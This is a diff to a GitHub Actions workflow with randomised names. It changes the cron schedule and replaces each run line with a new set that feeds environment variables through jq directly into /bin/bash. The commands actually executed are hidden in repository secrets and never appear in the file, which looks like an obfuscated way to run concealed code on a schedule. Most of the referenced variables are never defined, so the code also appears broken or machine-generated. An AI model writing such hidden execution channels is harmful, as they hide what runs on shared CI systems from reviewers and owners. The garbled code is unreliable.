@@ -3,23 +3,23 @@ name: overcookedmiserable
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 2/6 * * *'
+    - cron: '17 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: overcookedmiserable
         env:
-          tvfrh0: ${{ secrets.tvfrh0 }}
+          waxsx38: ${{ secrets.waxsx38 }}
         run: |
-          echo $tvfrh0 | jq -r .sbb00 | /bin/bash
-          echo $mk32023 | jq -r .k57046 | /bin/bash
-          echo $se09189 | jq -r .jf1 | /bin/bash
-          echo $wo1 | jq -r .jwton74491 | /bin/bash
-          echo $yurdb392 | jq -r .imzvl72886 | /bin/bash
-          echo $u52 | jq -r .pycmg87 | /bin/bash
-          echo $u951 | jq -r .kxv13 | /bin/bash
-          echo $rof1 | jq -r .e5402 | /bin/bash
+          echo $waxsx38 | jq -r .i50290 | /bin/bash
+          echo $wz6 | jq -r .lgh2141 | /bin/bash
+          echo $wdttt92 | jq -r .g63622 | /bin/bash
+          echo $rmlk4505 | jq -r .tbmz307 | /bin/bash
+          echo $spjk8945 | jq -r .m31532 | /bin/bash
+          echo $yqiuo25 | jq -r .trfuy59 | /bin/bash
+          echo $hb8915 | jq -r .gwm9 | /bin/bash
+          echo $mzz42834 | jq -r .si4046 | /bin/bash
+          echo $vjhw0093 | jq -r .nssim24 | /bin/bash
 
